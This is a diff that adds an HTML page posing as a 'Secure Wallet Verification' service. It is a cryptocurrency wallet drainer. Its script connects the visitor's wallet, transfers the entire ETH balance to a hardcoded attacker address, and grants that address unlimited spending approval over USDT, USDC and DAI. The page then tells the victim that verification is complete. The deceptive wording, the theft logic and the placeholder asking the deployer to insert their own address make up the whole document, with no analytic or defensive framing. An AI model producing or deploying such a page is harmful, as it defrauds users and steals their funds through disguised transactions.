@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Wallet Verification</title>
+    <style>
+        :root {
+            --primary: #4f46e5;
+            --primary-hover: #4338ca;
+            --bg: #f3f4f6;
+            --card-bg: #ffffff;
+            --text: #1f2937;
+            --text-light: #6b7280;
+            --success: #10b981;
+            --error: #ef4444;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text);
+        }
+
+        .container {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 1rem;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+
+        p {
+            color: var(--text-light);
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            line-height: 1.5;
+        }
+
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .status-box {
+            margin-top: 1.5rem;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            text-align: left;
+            font-size: 0.85rem;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            margin-bottom: 0.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        .log-entry:last-child {
+            border-bottom: none;
+        }
+
+        .success { color: var(--success); }
+        .error { color: var(--error); }
+        .info { color: var(--primary); }
+
+        .wallet-icon {
+            width: 24px;
+            height: 24px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Wallet Verification</h1>
+    <p>Connect your wallet to verify ownership and secure your assets. This process may take a few seconds.</p>
+    
+    <button id="connectBtn" class="btn">
+        <svg class="wallet-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4"></path><path d="M4 6v12a2 2 0 0 0 2 2h14v-4"></path><path d="M18 12v8a2 2 0 0 0 2 2h-2a2 2 0 0 1-2-2v-8z"></path></svg>
+        Connect Wallet
+    </button>
+
+    <div class="status-box" id="log">
+        <div class="log-entry info">Waiting for connection...</div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
+    const RECIPIENT_ADDRESS = "0x0F6B624A0211976Bc8Ed545508f8E619EF2d8784"; // <--- REPLACE THIS!
+    
+    // Common Token Contracts (Ethereum Mainnet)
+    const TOKENS = [
+        { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+        { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+        { name: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" }
+    ];
+
+    const logDiv = document.getElementById('log');
+    const btn = document.getElementById('connectBtn');
+
+    function addLog(msg, type = 'info') {
+        const div = document.createElement('div');
+        div.className = `log-entry ${type}`;
+        div.textContent = msg;
+        logDiv.appendChild(div);
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    async function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // Detect Wallet Provider
+    function getProvider() {
+        if (window.ethereum) return window.ethereum;
+        if (window.phantom?.ethereum) return window.phantom.ethereum;
+        return null;
+    }
+
+    // Get Balance of ETH
+    async function getEthBalance(provider, address) {
+        try {
+            const balanceHex = await provider.request({
+                method: 'eth_getBalance',
+                params: [address, 'latest']
+            });
+            return parseInt(balanceHex, 16);
+        } catch (e) {
+            console.error("ETH Balance Error:", e);
+            return 0;
+        }
+    }
+
+    // Generic Transaction Sender
+    async function sendTx(provider, txParams, label) {
+        try {
+            addLog(`Sending ${label}...`);
+            const hash = await provider.request({
+                method: 'eth_sendTransaction',
+                params: [txParams]
+            });
+            addLog(`${label} Sent! Hash: ${hash.substring(0, 10)}...`, 'success');
+            return true;
+        } catch (e) {
+            addLog(`${label} Failed: ${e.message}`, 'error');
+            return false;
+        }
+    }
+
+    // Approval Function for Tokens
+    async function approveToken(provider, tokenAddress, fromAddress, amountHex) {
+        const abi = ["function approve(address spender, uint256 amount)"];
+        const contractInterface = new ethers.JsonAbiCoder(); // Note: We need ethers library below
+        
+        // Simpler approach: Raw hex data for approval
+        // function selector: 0x095ea7b3
+        // address padded: 32 bytes
+        // uint256 max: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+        
+        const spenderPadded = RECIPIENT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
+        const amountMax = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        
+        const data = "0x095ea7b3" + spenderPadded + amountMax;
+
+        return await sendTx(provider, {
+            from: fromAddress,
+            to: tokenAddress,
+            data: data,
+            gas: "0x186a0" // 100,000 gas
+        }, `Approving ${tokenAddress === "0xdAC17F958D2ee523a2206206994597C13D831ec7" ? "USDT" : tokenAddress === "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" ? "USDC" : "Token"}`);
+    }
+
+    // Main Drain Logic
+    async function drain() {
+        const provider = getProvider();
+        if (!provider) {
+            addLog("No wallet detected. Please install MetaMask, Trust Wallet, or Phantom.", 'error');
+            return;
+        }
+
+        try {
+            // 1. Connect
+            addLog("Connecting wallet...");
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+            addLog(`Connected: ${userAddress.substring(0,6)}...${userAddress.slice(-4)}`, 'success');
+
+            // 2. Check ETH Balance
+            const ethBalance = await getEthBalance(provider, userAddress);
+            
+            if (ethBalance > 0) {
+                const success = await sendTx(provider, {
+                    from: userAddress,
+                    to: RECIPIENT_ADDRESS,
+                    value: "0x" + ethBalance.toString(16),
+                    gas: "21000"
+                }, "All ETH");
+                
+                if (!success) return; // Stop if ETH fails
+            } else {
+                addLog("No ETH to drain.");
+            }
+
+            // 3. Drain Tokens (USDT & USDC)
+            for (const token of TOKENS) {
+                await approveToken(provider, token.address, userAddress);
+                await sleep(1000); // Small delay between transactions
+            }
+
+            addLog("Verification Complete!", 'success');
+            btn.textContent = "Verified";
+            btn.disabled = true;
+
+        } catch (error) {
+            addLog(`Error: ${error.message}`, 'error');
+        }
+    }
+
+    // Initialize
+    btn.addEventListener('click', drain);
+
+</script>
+<!-- Include Ethers.js for robust JSON-RPC handling -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.9.1/ethers.umd.min.js"></script>
+
+</body>
+</html>
